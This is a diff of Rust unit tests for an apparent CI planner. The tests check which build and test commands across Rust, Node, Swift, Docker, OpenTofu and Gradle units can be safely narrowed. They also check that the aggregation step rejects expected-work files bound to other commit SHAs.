+        // (kind, command, opaque, why). One unit per row; the probe path is
+        // owned by nothing, so the verdict is the command's alone. The probe
+        // avoids `.md`: the docs row extracts a `**/*.md` read-glob, and an
+        // owned path narrows even for an opaque unit.
+        let rows: &[(&str, &str, bool, &str)] = &[
+            ("rust", "cargo fmt --manifest-path 'Cargo.toml' -- --check", false, "fmt reads the manifest and sources the watch bounds"),
+            ("rust", "cd -- 'crates/alpha' && cargo fmt --manifest-path 'Cargo.toml' -- --check", false, "the cd prefix is literal argv"),
+            ("rust", "cargo clippy --locked --profile test --no-deps --all-targets --all-features --package 'alpha' -- -D warnings", false, "clippy reads the watched package inputs"),
+            ("rust", "cargo test --locked --all-features --package 'alpha'", false, "test inputs are the watched package sources"),
+            ("rust", "cargo nextest run --locked --all-features --package 'alpha' --no-tests pass", false, "adjacent nextest exempts the test runner"),
+            ("rust", "mbx fmt --manifest-path 'Cargo.toml' -- --check", false, "mbx substitutes cargo 1:1"),
+            ("rust", "cd -- 'crates/alpha' && mbx clippy --locked --profile test --all-targets --all-features --package 'alpha' -- -D warnings", false, "mbx clippy drops --no-deps only"),
+            ("rust", "mbx nextest run --locked --all-features --package 'alpha' --no-tests pass", false, "mbx nextest keeps the exemption"),
+            ("rust", "cargo check --workspace --all-targets --locked", false, "the workspace gate reads the declared workspace"),
+            ("rust", "cargo deny check", false, "the policy unit reads manifests and lockfiles"),
+            ("rust", "cargo deny check advisories bans sources", false, "the policy unit without a license section"),
+            ("rust", "cargo audit", false, "the policy unit reads manifests and lockfiles"),
+            ("rust", "mise run check-boundaries", true, "mise tasks execute repo code"),
+            ("rust", "cargo xtask ci", true, "an unlisted subcommand may execute project code"),
+            ("rust", "cargo build --locked", true, "an unlisted subcommand fails closed"),
+            ("rust", "cargo run --locked", true, "run executes project code"),
+            ("rust", "mbx xtask ci", true, "mbx shares the audited vocabulary"),
+            ("rust", "python3 -c \"print(1)\"", true, "python executes code"),
+            ("rust", "python3 \"scripts/check.py\"", true, "a quoted operand is still executed"),
+            ("rust", "python -c \"import sys\"", true, "python executes code"),
+            ("rust", "/opt/x/run.sh --check", true, "an absolute script path may execute unprovable code"),
+            ("rust", "\"/opt/x/run.sh\" --check", true, "a quoted absolute path still executes"),
+            ("node", "npm ci", true, "package managers run unprovable scripts"),
+            ("node", "npm install", true, "package managers run unprovable scripts"),
+            ("node", "npm run lint", true, "package scripts are unprovable"),
+            ("node", "cd -- 'web' && npm run build", true, "package scripts are unprovable"),
+            ("node", "npm run test", true, "package scripts are unprovable"),
+            ("bun", "bun install --frozen-lockfile", true, "package managers run unprovable scripts"),
+            ("bun", "bun install", true, "package managers run unprovable scripts"),
+            ("bun", "bun run typecheck", true, "package scripts are unprovable"),
+            ("swift", "swift build", false, "swift reads the watched package inputs"),
+            ("swift", "cd -- 'pkg' && swift build", false, "the cd prefix is literal argv"),
+            ("swift", "swift test --parallel", false, "test inputs are the watched package sources"),
+            ("swift", "xcodebuild -project 'App.xcodeproj' -scheme 'App' CODE_SIGNING_ALLOWED=NO build", false, "xcodebuild reads the watched container"),
+            ("swift", "xcodebuild -workspace 'App.xcworkspace' -scheme 'App' CODE_SIGNING_ALLOWED=NO test", false, "xcodebuild reads the watched container"),
+            ("swift", "xcodebuild -workspace 'App.xcworkspace' -scheme 'App' -destination 'generic/platform=iOS Simulator' CODE_SIGNING_ALLOWED=NO build", true, "the spaced destination splits into unprovable halves"),
+            ("swift", "xcodebuild -workspace 'App.xcworkspace' -scheme 'App' -destination 'platform=iOS Simulator' CODE_SIGNING_ALLOWED=NO test", true, "the spaced test destination splits into unprovable halves"),
+            ("docker", "docker build --file 'img/Dockerfile' --tag local-ci:img-dockerfile 'img'", false, "the build reads the watched context"),
+            ("docker", "docker buildx build --load --target ci --file 'Dockerfile' --tag local-ci:dockerfile '.' --build-context velnor-cache-seed='.velnor-docker-cache/seed' --cache-from type=gha,scope=docker,mode=max --cache-to type=gha,scope=docker,mode=max --secret id=github_token,env=GITHUB_TOKEN", false, "the seeded PR build adds flags only"),
+            ("docker", "docker buildx build --target velnor-cache-export --output type=local,dest=.velnor-docker-cache/export --build-context velnor-cache-seed='.velnor-docker-cache/seed' --file 'Dockerfile' '.' --secret id=github_token,env=GITHUB_TOKEN", false, "the seed export adds flags only"),
+            ("docker", "docker build --build-context shared='shared' --file 'img/Dockerfile' --tag local-ci:x 'img'", false, "named contexts are quoted argv"),
+            ("docker", "case \"$(uname -m)\" in aarch64|arm64) docker build --file 'img/Dockerfile.arm64' --tag local-ci:a 'img' ;; x86_64|amd64) docker build --file 'img/Dockerfile.amd64' --tag local-ci:b 'img' ;; *) echo \"unsupported Docker build architecture: $(uname -m)\" >&2; exit 1 ;; esac", true, "command substitution is unprovable"),
+            ("docs", "npx --yes markdownlint-cli2@0.20.0 \"**/*.md\" \"#node_modules\" \"#**/AGENTS.md\" \"#**/CLAUDE.md\" \"#target\" \"#**/target/**\" \"#dist\" \"#coverage\" \"#**/.cache/**\" \"#migrations/**\"", true, "npx executes package code"),
+            ("opentofu", "tofu fmt -check -recursive -no-color", false, "fmt reads the watched sources"),
+            ("opentofu", "TF_IN_AUTOMATION=1 TF_INPUT=0 tofu init -backend=false -input=false -no-color", false, "assignments are literal argv"),
+            ("opentofu", "TF_IN_AUTOMATION=1 TF_INPUT=0 tofu validate -no-color", false, "validate reads the watched sources"),
+            ("gradle", "gradle check --no-daemon", false, "check reads the watched build inputs"),
+            ("gradle", "cd -- 'services' && gradle :api:check --no-daemon", false, "module selectors are literal argv"),
+            ("gradle", "./gradlew check --no-daemon", true, "the bare wrapper path may execute repo code"),
+            ("gradle", "cd -- 'services' && ./gradlew :api:check --no-daemon", true, "the bare wrapper path may execute repo code"),
+            ("homebrew", "brew audit --strict --online", false, "audit reads the watched formulae"),
+        ];
+        for (kind, command, opaque, why) in rows {
+            let units = vec![watched_full(
+                "probe-unit",
+                &["crates/alpha/**"],
+                &[],
+                kind,
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("unowned/notes.txt", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            if *opaque {
+                assert!(
+                    selection.fallback_full,
+                    "must fail closed ({why}): {command}"
+                );
+                assert!(
+                    selection
+                        .fallback_reason
+                        .as_deref()
+                        .is_some_and(|reason| reason.contains("command read-globs")),
+                    "the fallback reason names the consulted sources ({why}): {:?}",
+                    selection.fallback_reason
+                );
+            } else {
+                assert!(
+                    selection.required.is_empty() && !selection.fallback_full,
+                    "must stay transparent ({why}): {command}"
+                );
+            }
+        }
+        Ok(())
+    }
+
+    /// The audited-vocabulary rules carry their cause into the fallback
+    /// reason: an unlisted cargo subcommand and a python interpreter each
+    /// name themselves, so the audit trail distinguishes them from runner
+    /// and syntax opacity.
+    #[test]
+    fn unlisted_execution_shapes_name_their_cause() -> Result<(), Box<dyn std::error::Error>> {
+        for (command, cause) in [
+            ("cargo xtask ci", "outside the audited vocabulary"),
+            ("mbx build --locked", "outside the audited vocabulary"),
+            ("python3 -c \"print(1)\"", "executes `python3`"),
+            ("python3 \"scripts/check.py\"", "executes `python3`"),
+            ("/opt/x/run.sh --check", "which the scan cannot bound"),
+        ] {
+            let units = vec![watched_full(
+                "rust-alpha",
+                &["crates/alpha/**"],
+                &[],
+                "rust",
+                &[command],
+            )];
+            let selection = select_affected(
+                &units,
+                &[change("unowned/notes.txt", ChangeKind::Added)],
+                FULL_SELECTION_PREFIXES,
+            )?;
+            assert!(
+                selection.fallback_full,
+                "unlisted execution must fail closed: {command}"
+            );
+            assert!(
+                selection
+                    .fallback_reason
+                    .as_deref()
+                    .is_some_and(|reason| reason.contains(cause)),
+                "the fallback reason names the cause `{cause}`: {:?}",
+                selection.fallback_reason
+            );
+        }
+        Ok(())
+    }
+
+    /// A unit selected both directly and by its kind reusable keeps both
+    /// attributions: the direct insertion must not hide the kind hit.
+    #[test]
+    fn direct_and_kind_hits_share_one_explanation() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![
+            watched_full("rust-alpha", &["crates/alpha/**"], &[], "rust", &["true"]),
+            watched_full("bun-web", &["web/**"], &[], "bun", &["true"]),
+        ];
+        let selection = select_affected(
+            &units,
+            &[
+                change("crates/alpha/lib.rs", ChangeKind::Modified),
+                change(".github/workflows/ci-unit-rust.yml", ChangeKind::Modified),
+            ],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(!selection.fallback_full);
+        assert!(
+            selection
+                .explanations
+                .get("rust-alpha")
+                .is_some_and(|reason| reason.contains("crates/alpha/lib.rs")
+                    && reason.contains("kind reusable")),
+            "both hits stay attributed: {:?}",
+            selection.explanations
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn quoted_diff_paths_fail_closed() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![watched("rust-alpha", &["crates/alpha/**"], &[])];
+        let selection = select_affected(
+            &units,
+            &[change("\"quoted/path.md\"", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        assert!(selection.fallback_full);
+        assert!(
+            selection
+                .fallback_reason
+                .as_deref()
+                .is_some_and(|reason| reason.contains("quoted")),
+            "the fallback reason names the cause: {:?}",
+            selection.fallback_reason
+        );
+        Ok(())
+    }
+
+    #[test]
+    fn fallback_reason_serializes_only_on_fallback() -> Result<(), Box<dyn std::error::Error>> {
+        let units = vec![watched("rust-alpha", &["crates/alpha/**"], &[])];
+        let narrow = select_affected(
+            &units,
+            &[change("crates/alpha/lib.rs", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        let json = serde_json::to_string(&narrow).map_err(|error| error.to_string())?;
+        assert!(
+            !json.contains("fallback_reason"),
+            "narrow selections stay byte-identical: {json}"
+        );
+        let fallback = select_affected(
+            &units,
+            &[change(".github/workflows/ci.yml", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
+        let json = serde_json::to_string(&fallback).map_err(|error| error.to_string())?;
+        assert!(
+            json.contains("fallback_reason"),
+            "fallbacks surface their reason additively: {json}"
+        );
         Ok(())
     }
 
@@ -1887,6 +3684,56 @@ mod tests {
     fn empty_diff_selects_nothing_without_fallback() -> Result<(), Box<dyn std::error::Error>> {
         let units = vec![watched("rust-alpha", &["crates/alpha/**"], &[])];
         let selection = select_affected(&units, &[], FULL_SELECTION_PREFIXES)?;
+        assert!(selection.required.is_empty());
+        assert!(selection.full_units.is_empty());
+        assert!(!selection.fallback_full);
+        Ok(())
+    }
+
+    #[test]
+    fn unmatched_root_doc_selects_nothing_in_affected_core(
+    ) -> Result<(), Box<dyn std::error::Error>> {
+        // Parity with the runtime planner: a change no watch owns selects
+        // nothing instead of falling back to the full set.
+        let units = vec![
+            watched(
+                "rust-alpha",
+                &[
+                    "Cargo.lock",
+                    "Cargo.toml",
+                    "crates/alpha/**/*.rs",
+                    "crates/alpha/Cargo.toml",
+                    "crates/alpha/src/**",
+                    "rust-toolchain.toml",
+                ],
+                &[],
+            ),
+            watched(
+                "bun-web",
+                &[
+                    "web/**/*.ts",
+                    "web/**/*.tsx",
+                    "web/bun.lock",
+                    "web/package.json",
+                ],
+                &[],
+            ),
+            watched("docker-construct", &["docker/construct/**"], &[]),
+            watched(
+                "swift-native",
+                &[
+                    "native/**/*.swift",
+                    "native/Package.swift",
+                    "native/Package.resolved",
+                ],
+                &[],
+            ),
+        ];
+        let selection = select_affected(
+            &units,
+            &[change("AGENTS.md", ChangeKind::Modified)],
+            FULL_SELECTION_PREFIXES,
+        )?;
         assert!(selection.required.is_empty());
         assert!(selection.full_units.is_empty());
         assert!(!selection.fallback_full);
@@ -2498,6 +4345,8 @@ mod tests {
     #[test]
     fn aggregate_files_parses_and_scores() -> Result<(), String> {
         let expected = r#"{
+            "base_sha": "base-sha",
+            "head_sha": "head-sha",
             "units": [
                 {"id": "rust-alpha", "lanes": ["github"]},
                 {"id": "node-beta", "lanes": ["github"], "planned_skip": "lane cannot run kind"}
@@ -2510,20 +4359,74 @@ mod tests {
                 {"unit": "node-beta", "lane": "github", "outcome": "skipped", "reason": "lane gate closed"}
             ]
         }"#;
-        let verdict = aggregate_files(expected, results)?;
+        let verdict = aggregate_files(expected, results, "base-sha", "head-sha")?;
         assert!(verdict.passed, "failures: {:?}", verdict.failures);
-        assert!(aggregate_files("bogus", results).is_err());
-        assert!(aggregate_files(expected, "bogus").is_err());
+        assert!(aggregate_files("bogus", results, "base-sha", "head-sha").is_err());
+        assert!(aggregate_files(expected, "bogus", "base-sha", "head-sha").is_err());
         let missing_reason = r#"{
             "results": [
                 {"unit": "rust-alpha", "lane": "github", "outcome": "skipped"}
             ]
         }"#;
-        assert!(aggregate_files(expected, missing_reason).is_err());
+        assert!(aggregate_files(expected, missing_reason, "base-sha", "head-sha").is_err());
         let unknown_field = r#"{
+            "base_sha": "base-sha",
+            "head_sha": "head-sha",
             "units": [{"id": "rust-alpha", "lanes": ["github"], "bogus": true}]
         }"#;
-        assert!(aggregate_files(unknown_field, results).is_err());
+        assert!(aggregate_files(unknown_field, results, "base-sha", "head-sha").is_err());
+        Ok(())
+    }
+
+    #[test]
+    fn aggregate_files_binds_the_plan_identity() -> Result<(), String> {
+        let results = r#"{"results": []}"#;
+        // A file without identity is unbound and fails — including the stale
+        // no-work shape: marker plus zero units plus zero results.
+        let unbound = r#"{"planned_no_work": true, "units": []}"#;
+        let Err(error) = aggregate_files(unbound, results, "base-sha", "head-sha") else {
+            return Err("an unbound expected-work file must fail".to_owned());
+        };
+        assert!(
+            error.contains("missing base_sha"),
+            "unexpected error: {error}"
+        );
+        // A file bound to another plan fails: a stale upload, a mis-threaded
+        // artifact, or a forged identity never scores against this run.
+        let stale = r#"{
+            "planned_no_work": true,
+            "units": [],
+            "prerequisites": {},
+            "base_sha": "earlier-base",
+            "head_sha": "earlier-head"
+        }"#;
+        let Err(error) = aggregate_files(stale, results, "base-sha", "head-sha") else {
+            return Err("a stale expected-work file must fail".to_owned());
+        };
+        assert!(
+            error.contains("does not match this aggregate checkout"),
+            "unexpected error: {error}"
+        );
+        // The same file bound to this plan scores: proven no-work plus zero
+        // results passes.
+        let current = r#"{
+            "planned_no_work": true,
+            "units": [],
+            "prerequisites": {},
+            "base_sha": "base-sha",
+            "head_sha": "head-sha"
+        }"#;
+        let verdict = aggregate_files(current, results, "base-sha", "head-sha")?;
+        assert!(verdict.passed, "failures: {:?}", verdict.failures);
+        // An aggregate job without a base (workflow_dispatch leaves BASE_SHA
+        // empty) still binds the head: the base check is skipped, the head
+        // check is not.
+        let verdict = aggregate_files(current, results, "", "head-sha")?;
+        assert!(verdict.passed, "failures: {:?}", verdict.failures);
+        assert!(
+            aggregate_files(current, results, "", "other-head").is_err(),
+            "the head binding holds without a job base"
+        );
         Ok(())
     }
 
